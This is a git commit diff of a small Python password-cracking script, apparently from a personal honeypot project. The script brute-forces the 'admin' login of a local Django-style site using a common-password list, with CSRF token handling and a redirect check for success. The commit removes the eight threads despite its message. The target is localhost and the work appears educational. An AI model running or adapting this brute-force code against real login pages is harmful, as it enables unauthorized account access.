d0ad8a0c47a3d5a01bb2fdf86e11790766bb8602
null-sneebly-exception <ashtippin1@gmail.com>
2022-03-22 23:09:38 -0400

    added threads to cracker

--- password_cracker/not_cool_cracker.py
+++ password_cracker/not_cool_cracker.py
@@ -10,24 +10,11 @@ def main():
     params = sys.argv
     username = "admin"
     url = "http://127.0.0.1:8000/login/"
-    t1 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":1})
-    t2 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":2})
-    t3 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":3})
-    t4 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":4})
-    t5 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":5})
-    t6 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":6})
-    t7 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":7})
-    t8 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":8})
-    t1.start()
-    t2.start()
-    t3.start()
-    t4.start()
-    t5.start()
-    t6.start()
-    t7.start()
-    t8.start()
+   
     bruteforce(username=username,url=url,index=0)
-
+    
+    
+    
 
 def searchforcsrf(input):
         x = input.text
@@ -38,8 +25,9 @@ def searchforcsrf(input):
         return mwt
 
 
+
 def bruteforce(username,url,index):
-    filez = open("1000-most-common-passwords.txt","r")
+    filez = open("C:/Users/ashti/honeypot_project/password_cracker/1000-most-common-passwords.txt","r")
     passworddict =filez.readlines()
     counter = index
     req = requests.get(url = url)
@@ -49,12 +37,10 @@ def bruteforce(username,url,index):
     global pwfoundflag
     while (counter < len(passworddict)) and pwfoundflag ==0:
         password = passworddict[counter].strip()
+        print("Trying Password: "+ password)
         headers = {'Content-type': 'application/x-www-form-urlencoded'}
         submitform = requests.post(headers=headers,url=url,cookies={"csrftoken":csrftoken},data={"csrfmiddlewaretoken":mwt,"username":username,"password":password},allow_redirects=False)
-        counter = counter + 9
-        if pwfoundflag ==1:
-            break
-        print("Trying Password: "+ password)
+        counter = counter + 1
         if submitform.status_code == 302:
             print("SUCCESSSSSSSSSSSSSSSSSSSSSSS")
             print("Password is    " + password)
@@ -63,3 +49,5 @@ def bruteforce(username,url,index):
         if  len(passworddict)<counter:
             print("password not found")
 main()
+
+
